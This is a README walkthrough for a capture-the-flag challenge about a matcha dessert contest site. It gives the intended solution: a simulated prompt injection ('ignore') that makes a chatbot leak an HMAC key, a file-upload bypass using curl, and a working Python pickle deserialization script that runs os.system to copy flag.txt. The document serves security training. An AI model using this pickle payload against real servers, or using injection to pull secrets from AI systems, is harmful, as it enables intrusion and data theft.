# 🍵MATCHA_w0r1d!
Misc CTF wargame presented at `The 31st PoC Hacking Camp`
> Share your most photogenic matcha dessert creations — from cakes to parfaits, ice creams to lattes — and celebrate the harmony of taste and aesthetics. By the way, you may find a secret spy in this contest...
<img width="1900" height="938" alt="Image" src="https://github.com/user-attachments/assets/6cf79bda-b459-4211-8844-37661d539efe" />

## Vulnerabilities applied
- Pickle deserialization vulnerability
- LLM prompt injection-alike (implemented as rule-based)
- Remote code execution(RCE) exploit
- File upload vulnerability
- and some Miscellaneous tricks hidden everywhere...

## Scenario & Hints
### 1. Ask MATCHA bot and steal the **SECRET**.
> This is prompt injection-alike system, which you can just inject keyword "ignore" in the prompt to get the key. (It's implemented with just a simple hard-coding, not with the actual openai API since it was realistically impossible in the CTF environment.)

<p align="center">
  <img src="https://github.com/user-attachments/assets/9257c097-292f-4160-9840-8155d593df90" width="32%" />
  <img src="https://github.com/user-attachments/assets/7f8a768c-080e-4ebf-9aac-fa012d8eb5b5" width="32%" />
  <img src="https://github.com/user-attachments/assets/b41d3833-cd1a-4a0e-9021-b104dd3cf11c" width="31.5%" />
</p>

- Once you make the matcha bot ignore the previous instruction of not answering hints about the secret key, you can get a miscellaneous string : `zaqwedsMrfvMuytgbnmMqazescMrfvbMjkiuyhnm,M_WasdeszxWtfcWiuygvbnWesztdcWygvbWklpoijnm,`
  - You can infer what this string means based on the keyboard's layout : `pickle_tickle`
  - This is the secret key that the attacker can use for generating **HMAC signature**, which is essential element inside the curl exploit afterwards.
  - And since the string has a word 'pickle' in it, attacker has to associate with the **pickle deserialization vulnerability**.

### 2. Upload function
> You can upload your matcha dessert picture through the `UPLOAD` button, and check all your submissions through the `MY SUBMISSIONS` button.

<p align="left">
  <img src="https://github.com/user-attachments/assets/c4cece09-2200-4fb7-ae0d-b1d143ff03ad" width="60%" />
</p>

- Extension filtering is applied on the server side — only `.jpg / .png / .pkl` is allowed for this upload section
- Image files with `'jpg, 'png'` extension can be shown on the site using the `My submissions` button, but the pickle file cannot be uploaded through the `upload` button and cannot be shown on the site neither.
- Attacker has to realize this point with few trials of debugging, and plan to use `curl` command in the terminal in order to upload the pickle file afterwards.

<p align="center">
  <img src="https://github.com/user-attachments/assets/febec0ae-06f3-4478-9d17-14fe29ee8140" />
</p>

- You can infer the path where your submissions are uploaded through the developer tools(F12) : `/uploads/{filename}`
  - However this is not the actual full path for this, the real path is `app/uploads/{filename}` — and you can get this hint by the element in the picture below.

<p align="center">
  <img src="https://github.com/user-attachments/assets/1faaf1bd-c747-4fae-a97e-fa8408f97e4d" width="80%" />
</p>

### 3. Exploit 
> Use the path and SECRET key you obtained in the previous steps, and write the exploit script for RCE attack as below.
> The location of flag.txt will be announced in advance — same location as app.py

```
# Attack example
# this is the python script file which the attacker uses in his local PC

import pickle, os, hashlib, hmac

class RCE:
    def __reduce__(self):
        return (os.system, ("cat flag.txt > app/uploads/hacked.txt",))

SECRET_KEY = "pickle_tickle"
payload = pickle.dumps(RCE())
sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()

with open("malicious.pkl", "wb") as f:
    f.write(payload)

print(f"HMAC signature: {sig}")
```

### 4. Upload the `.pkl` file w/ signature using `$curl`
> Upload the pickle file you made under the path: `app/uploads/`, then the RCE will work simultaneously as the command be executed automatically. The sig may be different with the example below since it depends on how you write the script in step 3.

<p align="center">
  <img src="https://github.com/user-attachments/assets/7789e994-f6c6-4049-8d05-fc3d46fab58c" width="70%" />
</p>

### 5. Finally Catch the FLAG. 🚩
> Check out the .txt file you uploaded through RCE in the MY SUBMISSIONS sections again, and you'll find out the .txt file has been uploaded well. Finally when you click the file, you can obtain the flag.

<p align="center">
  <img src="https://github.com/user-attachments/assets/c5d1a659-cb95-46d5-b088-8e80f93a5ae2" width="70%" />
  <img src="https://github.com/user-attachments/assets/7337c346-8fa6-4428-a56f-3d6fc08751a4" width="70%" />
</p>
